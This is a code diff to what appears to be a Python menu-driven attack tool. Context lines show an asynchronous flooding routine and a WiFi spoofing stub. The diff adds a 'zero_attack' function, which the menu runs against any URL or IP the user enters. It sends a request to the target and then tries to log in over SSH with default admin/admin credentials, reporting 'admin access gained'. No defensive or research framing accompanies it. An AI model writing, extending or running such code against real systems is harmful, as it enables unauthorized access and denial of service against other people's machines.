@@ -82,12 +82,23 @@ def network_stress(ip=None, custom_urls=None):
         tasks.append(loop.create_task(start_flood(url, ip)))
     loop.run_until_complete(asyncio.wait(tasks))
 
-def connect_and_stress(target_ip, relay_ip):
-    # Example function to connect to a relay IP and then perform stress testing
-    print(f"Connecting to {relay_ip} to relay stress test to {target_ip}")
-    # Placeholder for connecting logic, e.g., using SSH or a VPN
-    # Once connected, initiate network stress
-    network_stress(target_ip)
+def zero_attack(url_or_ip):
+    # Send a hello message
+    try:
+        response = requests.post(url_or_ip, data={'message': 'hello'})
+        print(f"Sent hello message to {url_or_ip}, response code: {response.status_code}")
+    except Exception as e:
+        print(f"Failed to send hello message to {url_or_ip}: {e}")
+
+    # Attempt to gain admin access via SSH
+    try:
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        client.connect(url_or_ip, username='admin', password='admin')  # Example credentials
+        print(f"Admin access gained on {url_or_ip}")
+        client.close()
+    except Exception as e:
+        print(f"Failed to gain admin access on {url_or_ip}: {e}")
 
 def wifi_spoofing():
     # Example command for WiFi spoofing
@@ -244,7 +255,8 @@ def display_ui():
             else:
                 continue
         elif choice == "2":
-            ip_address = input("Enter the IP address to use: ").strip()
+            url_or_ip = input("Enter the URL or IP address to use: ").strip()
+            zero_attack(url_or_ip)
         elif choice == "3":
             print("Selected Wireless WiFi-based")
             nearby_options = ["Option1", "Option2", "Option3"]
